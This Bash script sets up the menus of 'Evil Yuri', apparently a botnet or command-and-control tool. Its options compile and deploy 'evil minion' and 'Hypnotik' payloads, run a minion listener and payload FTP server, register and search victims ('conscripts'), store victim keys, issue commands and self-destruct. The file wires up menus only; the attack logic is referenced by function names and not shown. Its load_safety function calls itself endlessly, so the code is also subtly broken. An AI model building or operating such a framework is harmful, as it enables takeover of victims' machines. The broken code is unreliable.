#!/bin/bash
#
# Regards, the Alveare Solutions society.
#
# SETUP

# LOADERS

function load_config () {
    load_project_label
    load_project_prompt
    load_project_safety
    load_project_default
    load_project_logging_levels
    load_project_cargo
    load_project_dependencies
}

function load_project_dependencies () {
    load_apt_dependencies ${EY_APT_DEPENDENCIES[@]}
    return $?
}

function load_project_prompt () {
    load_prompt_string "$EY_PS3"
    return $?
}

function load_project_safety () {
    load_safety "$EY_SAFETY"
    return $?
}

function load_project_logging_levels () {
    load_logging_levels ${EY_LOGGING_LEVELS[@]}
    return $?
}

function load_safety () {
    load_safety "$EY_SAFETY"
    return $?
}

function load_project_cargo () {
    if [ ${#EY_CARGO[@]} -eq 0 ]; then
        warning_msg "No cargo scripts found docked to $EY_SCRIPT_NAME."
        return 1
    fi
    for cargo in ${!EY_CARGO[@]}; do
        load_cargo "$cargo" "${EY_CARGO[$cargo]}"
    done
    return $?
}

function load_project_default () {
    for setting in ${!EY_DEFAULT[@]}; do
        load_default_setting "$setting" "${EY_DEFAULT[$setting]}"
    done
    return $?
}

function load_project_label () {
    load_script_name "$EY_SCRIPT_NAME"
    return $?
}

# PROJECT SETUP

function project_setup () {
    lock_and_load
    load_config
    create_menu_controllers
    setup_menu_controllers
}

function setup_menu_controllers () {
    setup_dependencies
    setup_main_menu_controller
    setup_log_viewer_menu_controller
    setup_wifi_commander_menu_controller
    setup_game_changer_menu_controller
    setup_evil_yuri_menu_controller
    setup_stage1_menu_controller
    setup_stage2_menu_controller
    setup_stage3_menu_controller
    setup_settings_menu_controller
    done_msg "${BLUE}$SCRIPT_NAME${RESET} controller setup complete."
    return 0
}

# SETUP DEPENDENCIES

function setup_dependencies () {
    apt_install_dependencies
    return $?
}

# GAME CHANGER SETUP

function setup_game_changer_menu_controller () {
    setup_game_changer_menu_option_compile_evil_minion
    setup_game_changer_menu_option_compile_hypnotik_payload
    setup_game_changer_menu_option_binary_minions
    setup_game_changer_menu_option_binary_payloads
    setup_game_changer_menu_option_back
    done_msg "(${CYAN}$GAMECHANGER_CONTROLLER_LABEL${RESET}) controller"\
        "option binding complete."
    return 0
}

function setup_game_changer_menu_option_compile_evil_minion () {
    setup_menu_controller_action_option \
        "$GAMECHANGER_CONTROLLER_LABEL" 'Compile-Evil-Minion' \
        'action_compile_evil_minion'
    return $?
}

function setup_game_changer_menu_option_compile_hypnotik_payload () {
    setup_menu_controller_action_option \
        "$GAMECHANGER_CONTROLLER_LABEL" 'Compile-Hypnotik-Payload' \
        'action_compile_hypnotik_payload'
    return $?
}

function setup_game_changer_menu_option_binary_minions () {
    setup_menu_controller_action_option \
        "$GAMECHANGER_CONTROLLER_LABEL" 'Binary-Minions' \
        'action_manage_binary_minions'
    return $?
}

function setup_game_changer_menu_option_binary_payloads () {
    setup_menu_controller_action_option \
        "$GAMECHANGER_CONTROLLER_LABEL" 'Binary-Payloads' \
        'action_manage_binary_payloads'
    return $?
}

function setup_game_changer_menu_option_back () {
    setup_menu_controller_action_option \
        "$GAMECHANGER_CONTROLLER_LABEL" 'Back' 'action_back'
    return $?
}

# WIFI COMMANDER SETUP

function setup_wifi_commander_menu_controller () {
    setup_wifi_commander_menu_option_connect_wifi
    setup_wifi_commander_menu_option_disconnect_wifi
    setup_wifi_commander_menu_option_display_access_points
    setup_wifi_commander_menu_option_back
    done_msg "(${CYAN}$WIFICOMMANDER_CONTROLLER_LABEL${RESET}) controller"\
        "option binding complete."
    return 0
}

function setup_wifi_commander_menu_option_connect_wifi () {
    setup_menu_controller_action_option \
        "$WIFICOMMANDER_CONTROLLER_LABEL" 'Connect-WiFi' \
        'action_connect_to_wireless_access_point'
    return $?
}

function setup_wifi_commander_menu_option_disconnect_wifi () {
    setup_menu_controller_action_option \
        "$WIFICOMMANDER_CONTROLLER_LABEL" 'Disconnect-WiFi' \
        'action_disconnect_from_wireless_access_point'
    return $?
}

function setup_wifi_commander_menu_option_display_access_points () {
    setup_menu_controller_action_option \
        "$WIFICOMMANDER_CONTROLLER_LABEL" 'Display-Access-Points' \
        'display_available_wireless_access_points'
    return $?
}

function setup_wifi_commander_menu_option_back () {
    setup_menu_controller_action_option \
        "$WIFICOMMANDER_CONTROLLER_LABEL" 'Back' 'action_back'
    return $?
}

# STAGE 1 SETUP

function setup_stage1_menu_controller () {
    setup_stage1_menu_option_setup_payload_ftp_server
    setup_stage1_menu_option_start_minion_listener
    setup_stage1_menu_option_deploy_evil_minion
    setup_stage1_menu_option_register_conscripts
    setup_stage1_menu_option_search_conscripts
    setup_stage1_menu_option_back
    done_msg "(${CYAN}$STAGE1_CONTROLLER_LABEL${RESET}) controller"\
        "option binding complete."
    return 0
}

function setup_stage1_menu_option_setup_payload_ftp_server () {
    setup_menu_controller_action_option \
        "$STAGE1_CONTROLLER_LABEL" 'Setup-Payload-FTP-Server' \
        'action_setup_payload_ftp_server'
    return $?
}

function setup_stage1_menu_option_start_minion_listener () {
    setup_menu_controller_action_option \
        "$STAGE1_CONTROLLER_LABEL" 'Start-Minion-Listener' \
        'action_start_minion_listener'
    return $?
}

function setup_stage1_menu_option_deploy_evil_minion () {
    setup_menu_controller_action_option \
        "$STAGE1_CONTROLLER_LABEL" 'Deploy-Evil-Minion' \
        'action_deploy_evil_minion'
    return $?
}

function setup_stage1_menu_option_register_conscripts () {
    setup_menu_controller_action_option \
        "$STAGE1_CONTROLLER_LABEL" 'Register-Conscripts' \
        'action_register_victims'
    return $?
}

function setup_stage1_menu_option_search_conscripts () {
    setup_menu_controller_action_option \
        "$STAGE1_CONTROLLER_LABEL" 'Search-Conscripts' \
        'action_search_victim_records'
    return $?
}

function setup_stage1_menu_option_back () {
    setup_menu_controller_action_option \
        "$STAGE1_CONTROLLER_LABEL" 'Back' 'action_back'
    return $?
}

# STAGE 2 SETUP

function setup_stage2_menu_controller () {
    setup_stage2_menu_option_deploy_hypnotik_payload
    setup_stage2_menu_option_conscript_groups
    setup_stage2_menu_option_back
    done_msg "(${CYAN}$STAGE2_CONTROLLER_LABEL${RESET}) controller"\
        "option binding complete."
    return 0
}

function setup_stage2_menu_option_deploy_hypnotik_payload () {
    setup_menu_controller_action_option \
        "$STAGE2_CONTROLLER_LABEL" 'Deploy-Hypnotik-Payload' \
        'action_deploy_hypnotik_payload'
    return $?
}

function setup_stage2_menu_option_conscript_groups () {
    setup_menu_controller_action_option \
        "$STAGE2_CONTROLLER_LABEL" 'Conscript-Groups' \
        'action_manage_victim_groups'
    return $?
}

function setup_stage2_menu_option_back () {
    setup_menu_controller_action_option \
        "$STAGE2_CONTROLLER_LABEL" 'Back' 'action_back'
    return $?
}

# STAGE 3 SETUP

function setup_stage3_menu_controller () {
    setup_stage3_menu_option_mission_instruction
    setup_stage3_menu_option_conscript_commander
    setup_stage3_menu_option_conscript_archives
    setup_stage3_menu_option_back
    done_msg "(${CYAN}$STAGE3_CONTROLLER_LABEL${RESET}) controller"\
        "option binding complete."
    return 0
}

function setup_stage3_menu_option_mission_instruction () {
    setup_menu_controller_action_option \
        "$STAGE3_CONTROLLER_LABEL" 'Mission-Instruction' \
        'action_mission_instruction'
    return $?
}

function setup_stage3_menu_option_conscript_commander () {
    setup_menu_controller_action_option \
        "$STAGE3_CONTROLLER_LABEL" 'Conscript-Commander' \
        'action_conscript_commander'
    return $?
}

function setup_stage3_menu_option_conscript_archives () {
    setup_menu_controller_action_option \
        "$STAGE3_CONTROLLER_LABEL" 'Conscript-Archives' \
        'action_manage_victim_archives'
    return $?
}

function setup_stage3_menu_option_back () {
    setup_menu_controller_action_option \
        "$STAGE3_CONTROLLER_LABEL" 'Back' 'action_back'
    return $?
}

# EVIL YURI SETUP

function setup_evil_yuri_menu_controller () {
    setup_evil_yuri_menu_option_stage1
    setup_evil_yuri_menu_option_stage2
    setup_evil_yuri_menu_option_stage3
    setup_evil_yuri_menu_option_help
    setup_evil_yuri_menu_option_back
    done_msg "(${CYAN}$EVIL_YURI_CONTROLLER_LABEL${RESET}) controller"\
        "option binding complete."
    return 0
}

function setup_evil_yuri_menu_option_stage1 () {
    setup_menu_controller_menu_option \
        "$EVIL_YURI_CONTROLLER_LABEL" 'Stage1-Discovery(+)' \
        "$STAGE1_CONTROLLER_LABEL"
    return $?
}

function setup_evil_yuri_menu_option_stage2 () {
    setup_menu_controller_menu_option \
        "$EVIL_YURI_CONTROLLER_LABEL" 'Stage2-Registration(+)' \
        "$STAGE2_CONTROLLER_LABEL"
    return $?
}

function setup_evil_yuri_menu_option_stage3 () {
    setup_menu_controller_menu_option \
        "$EVIL_YURI_CONTROLLER_LABEL" 'Stage3-Command(&)Control' \
        "$STAGE3_CONTROLLER_LABEL"
    return $?
}

function setup_evil_yuri_menu_option_help () {
    setup_menu_controller_action_option \
        "$EVIL_YURI_CONTROLLER_LABEL" 'Help' 'action_help'
    return $?
}

function setup_evil_yuri_menu_option_back () {
    setup_menu_controller_action_option \
        "$EVIL_YURI_CONTROLLER_LABEL" 'Back' 'action_back'
    return $?
}

# LOG VIEWER SETUP

function setup_log_viewer_menu_controller () {
    setup_log_viewer_menu_option_display_tail
    setup_log_viewer_menu_option_display_head
    setup_log_viewer_menu_option_display_more
    setup_log_viewer_menu_option_clear_log
    setup_log_viewer_menu_option_back
    done_msg "(${CYAN}$LOGVIEWER_CONTROLLER_LABEL${RESET}) controller"\
        "option binding complete."
    return 0
}

function setup_log_viewer_menu_option_clear_log () {
    setup_menu_controller_action_option \
        "$LOGVIEWER_CONTROLLER_LABEL"  'Clear-Log' 'action_clear_log_file'
    return $?
}

function setup_log_viewer_menu_option_display_tail () {
    setup_menu_controller_action_option \
        "$LOGVIEWER_CONTROLLER_LABEL"  'Display-Tail' 'action_log_view_tail'
    return $?
}

function setup_log_viewer_menu_option_display_head () {
    setup_menu_controller_action_option \
        "$LOGVIEWER_CONTROLLER_LABEL"  'Display-Head' 'action_log_view_head'
    return $?
}

function setup_log_viewer_menu_option_display_more () {
    setup_menu_controller_action_option \
        "$LOGVIEWER_CONTROLLER_LABEL"  'Display-More' 'action_log_view_more'
    return $?
}

function setup_log_viewer_menu_option_back () {
    setup_menu_controller_action_option \
        "$LOGVIEWER_CONTROLLER_LABEL"  'Back' 'action_back'
    return $?
}

# SETTINGS SETUP

function setup_settings_menu_controller () {
    setup_settings_menu_option_set_safety_flag
    setup_settings_menu_option_set_log_file
    setup_settings_menu_option_set_log_lines
    setup_settings_menu_option_set_temporary_file
    setup_settings_menu_option_install_dependencies
    setup_settings_menu_option_back
    setup_settings_menu_option_set_minion_directory
    setup_settings_menu_option_set_payload_directory
    setup_settings_menu_option_set_template_directory
    setup_settings_menu_option_set_evil_minion
    setup_settings_menu_option_set_hypnotik_payload
    setup_settings_menu_option_set_mission_instruction
    setup_settings_menu_option_set_foreground_flag
    setup_settings_menu_option_set_papertrail_flag
    setup_settings_menu_option_set_port_number
    setup_settings_menu_option_set_victim_user
    setup_settings_menu_option_set_victim_key
    setup_settings_menu_option_set_protocol
    setup_settings_menu_option_set_victim_archive
    setup_settings_menu_option_set_ftp_template
    setup_settings_menu_option_set_ftp_address
    setup_settings_menu_option_set_victim_identifiers
    setup_settings_menu_option_set_victim_addresses
    setup_settings_menu_option_set_group_labels
    setup_settings_menu_option_set_group_size
    setup_settings_menu_option_set_target
    setup_settings_menu_option_set_search_criteria
    setup_settings_menu_option_victim_directory
    setup_settings_menu_option_conscript_index
    setup_settings_menu_option_archive_index
    setup_settings_menu_option_group_index
    setup_settings_menu_option_source_file
    setup_settings_menu_option_out_file
    done_msg "(${CYAN}$SETTINGS_CONTROLLER_LABEL${RESET}) controller"\
        "option binding complete."
    return 0
}

function setup_settings_menu_option_victim_directory () {
    setup_menu_controller_action_option \
        "$SETTINGS_CONTROLLER_LABEL" 'Set-Victim-Directory' \
        'action_set_victim_directory'
    return $?
}

function setup_settings_menu_option_conscript_index () {
    setup_menu_controller_action_option \
        "$SETTINGS_CONTROLLER_LABEL" 'Set-Conscript-Index' \
        'action_set_conscript_index_file'
    return $?
}

function setup_settings_menu_option_archive_index () {
    setup_menu_controller_action_option \
        "$SETTINGS_CONTROLLER_LABEL" 'Set-Archive-Index' \
        'action_set_archive_index_file'
    return $?
}

function setup_settings_menu_option_group_index () {
    setup_menu_controller_action_option \
        "$SETTINGS_CONTROLLER_LABEL" 'Set-Group-Index' \
        'action_set_group_index_file'
    return $?
}

function setup_settings_menu_option_source_file () {
    setup_menu_controller_action_option \
        "$SETTINGS_CONTROLLER_LABEL" 'Set-Source-File' \
        'action_set_source_file'
    return $?
}

function setup_settings_menu_option_out_file () {
    setup_menu_controller_action_option \
        "$SETTINGS_CONTROLLER_LABEL" 'Set-Out-File' \
        'action_set_out_file'
    return $?
}

function setup_settings_menu_option_set_target () {
    setup_menu_controller_action_option \
        "$SETTINGS_CONTROLLER_LABEL" 'Set-Target' \
        'action_set_target'
    return $?
}

function setup_settings_menu_option_set_search_criteria () {
    setup_menu_controller_action_option \
        "$SETTINGS_CONTROLLER_LABEL" 'Set-Search-Criteria' \
        'action_set_search_criteria'
    return $?
}

function setup_settings_menu_option_set_group_size () {
    setup_menu_controller_action_option \
        "$SETTINGS_CONTROLLER_LABEL" 'Set-Group-Size' \
        'action_set_group_size'
    return $?
}

function setup_settings_menu_option_set_minion_directory () {
    setup_menu_controller_action_option \
        "$SETTINGS_CONTROLLER_LABEL" 'Set-Minion-Directory' \
        'action_set_minion_directory'
    return $?
}

function setup_settings_menu_option_set_payload_directory () {
    setup_menu_controller_action_option \
        "$SETTINGS_CONTROLLER_LABEL" 'Set-Payload-Directory' \
        'action_set_payload_directory'
    return $?
}

function setup_settings_menu_option_set_template_directory () {
    setup_menu_controller_action_option \
        "$SETTINGS_CONTROLLER_LABEL" 'Set-Template-Directory' \
        'action_set_template_directory'
    return $?
}

function setup_settings_menu_option_set_evil_minion () {
    setup_menu_controller_action_option \
        "$SETTINGS_CONTROLLER_LABEL" 'Set-Evil-Minion' \
        'action_set_evil_minion'
    return $?
}

function setup_settings_menu_option_set_hypnotik_payload () {
    setup_menu_controller_action_option \
        "$SETTINGS_CONTROLLER_LABEL" 'Set-Hypnotik-Payload' \
        'action_set_hypnotik_payload'
    return $?
}

function setup_settings_menu_option_set_mission_instruction () {
    setup_menu_controller_action_option \
        "$SETTINGS_CONTROLLER_LABEL" 'Set-Mission-Instruction' \
        'action_set_mission_instruction'
    return $?
}

function setup_settings_menu_option_set_foreground_flag () {
    # [ NOTE ]: ???
    setup_menu_controller_action_option \
        "$SETTINGS_CONTROLLER_LABEL" 'Set-Foreground-Flag' \
        'action_set_foreground_flag'
    return $?
}

function setup_settings_menu_option_set_papertrail_flag () {
    setup_menu_controller_action_option \
        "$SETTINGS_CONTROLLER_LABEL" 'Set-Papertrail-Flag' \
        'action_set_papertrail_flag'
    return $?
}

function setup_settings_menu_option_set_port_number () {
    setup_menu_controller_action_option \
        "$SETTINGS_CONTROLLER_LABEL" 'Set-Port-Number' \
        'action_set_port_number'
    return $?
}

function setup_settings_menu_option_set_victim_user () {
    setup_menu_controller_action_option \
        "$SETTINGS_CONTROLLER_LABEL" 'Set-Conscript-User' \
        'action_set_victim_user'
    return $?
}

function setup_settings_menu_option_set_victim_key () {
    setup_menu_controller_action_option \
        "$SETTINGS_CONTROLLER_LABEL" 'Set-Conscript-Key' \
        'action_set_victim_key'
    return $?
}

function setup_settings_menu_option_set_protocol () {
    setup_menu_controller_action_option \
        "$SETTINGS_CONTROLLER_LABEL" 'Set-Protocol' \
        'action_set_connection_protocol'
    return $?
}

function setup_settings_menu_option_set_victim_archive () {
    setup_menu_controller_action_option \
        "$SETTINGS_CONTROLLER_LABEL" 'Set-Conscript-Archive' \
        'action_set_victim_archive'
    return $?
}

function setup_settings_menu_option_set_ftp_template () {
    setup_menu_controller_action_option \
        "$SETTINGS_CONTROLLER_LABEL" 'Set-FTP-Template' \
        'action_set_ftp_server_config_template'
    return $?
}

function setup_settings_menu_option_set_ftp_address () {
    setup_menu_controller_action_option \
        "$SETTINGS_CONTROLLER_LABEL" 'Set-FTP-Address' \
        'action_set_ftp_server_address'
    return $?
}

function setup_settings_menu_option_set_victim_identifiers () {
    setup_menu_controller_action_option \
        "$SETTINGS_CONTROLLER_LABEL" 'Set-Conscript-Identifiers' \
        'action_set_victim_identifiers'
    return $?
}

function setup_settings_menu_option_set_victim_addresses () {
    setup_menu_controller_action_option \
        "$SETTINGS_CONTROLLER_LABEL" 'Set-Conscript-Addresses' \
        'action_set_victim_addresses'
    return $?
}

function setup_settings_menu_option_set_group_labels () {
    setup_menu_controller_action_option \
        "$SETTINGS_CONTROLLER_LABEL" 'Set-Group-Labels' \
        'action_set_group_labels'
    return $?
}

function setup_settings_menu_option_set_safety_flag () {
    setup_menu_controller_action_option \
        "$SETTINGS_CONTROLLER_LABEL" 'Set-Safety-Flag' \
        'action_set_safety_flag'
    return $?
}

function setup_settings_menu_option_set_temporary_file () {
    setup_menu_controller_action_option \
        "$SETTINGS_CONTROLLER_LABEL" 'Set-Temporary-File' \
        'action_set_temporary_file'
    return $?
}

function setup_settings_menu_option_set_log_file () {
    setup_menu_controller_action_option \
        "$SETTINGS_CONTROLLER_LABEL" 'Set-Log-File' \
        'action_set_log_file'
    return $?
}

function setup_settings_menu_option_set_log_lines () {
    setup_menu_controller_action_option \
        "$SETTINGS_CONTROLLER_LABEL" 'Set-Log-Lines' \
        'action_set_log_lines'
    return $?
}

function setup_settings_menu_option_install_dependencies () {
    setup_menu_controller_action_option \
        "$SETTINGS_CONTROLLER_LABEL" 'Install-Dependencies' \
        'action_install_project_dependencies'
    return $?
}

function setup_settings_menu_option_back () {
    setup_menu_controller_action_option \
        "$SETTINGS_CONTROLLER_LABEL" 'Back' 'action_back'
    return $?
}

# MAIN MENU SETUP

function setup_main_menu_controller() {
    setup_main_menu_option_evil_yuri
    setup_main_menu_option_self_destruct
    setup_main_menu_option_wifi_commander
    setup_main_menu_option_game_changer
    setup_main_menu_option_log_viewer
    setup_main_menu_option_control_panel
    setup_main_menu_option_back
    done_msg "(${CYAN}$MAIN_CONTROLLER_LABEL${RESET}) controller"\
        "option binding complete."
    return 0
}

function setup_main_menu_option_wifi_commander () {
    setup_menu_controller_menu_option \
        "$MAIN_CONTROLLER_LABEL" "WiFi-Commander" \
        "$WIFICOMMANDER_CONTROLLER_LABEL"
    return $?
}
function setup_main_menu_option_game_changer () {
    setup_menu_controller_menu_option \
        "$MAIN_CONTROLLER_LABEL" "Game-Changer" \
        "$GAMECHANGER_CONTROLLER_LABEL"
    return $?
}

function setup_main_menu_option_log_viewer () {
    setup_menu_controller_menu_option \
        "$MAIN_CONTROLLER_LABEL" "Log-Viewer" \
        "$LOGVIEWER_CONTROLLER_LABEL"
    return $?
}

function setup_main_menu_option_control_panel () {
    setup_menu_controller_menu_option \
        "$MAIN_CONTROLLER_LABEL" "Control-Panel" \
        "$SETTINGS_CONTROLLER_LABEL"
    return $?
}

function setup_main_menu_option_back () {
    setup_menu_controller_action_option \
        "$MAIN_CONTROLLER_LABEL" "Back" \
        'action_back'
    return $?
}

function setup_main_menu_option_evil_yuri () {
    setup_menu_controller_menu_option \
        "$MAIN_CONTROLLER_LABEL" "Evil-Yuri" \
        "$EVIL_YURI_CONTROLLER_LABEL"
    return $?
}

function setup_main_menu_option_self_destruct () {
    setup_menu_controller_action_option \
        "$MAIN_CONTROLLER_LABEL" "Self-Destruct" \
        'action_project_self_destruct'
    return $?
}

# CODE DUMP

